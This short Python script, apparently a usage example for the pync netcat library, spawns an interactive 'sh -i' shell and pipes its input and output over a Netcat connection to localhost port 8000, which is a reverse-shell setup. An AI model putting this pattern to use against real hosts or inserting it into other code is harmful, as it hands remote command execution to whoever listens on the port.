# -*- coding: utf-8 -*-

import contextlib
import pync


def main():
    ls = pync.Popen(['sh', '-i'],
            stdin=pync.PIPE,
            stdout=pync.PIPE,
            stderr=pync.STDOUT,
    )

    nc = pync.Netcat('localhost', 8000,
            v=True,
            stdin=ls.stdout,
            stdout=ls.stdin,
    )

    with contextlib.closing(nc):
        nc.readwrite()


if __name__ == '__main__':
    main()

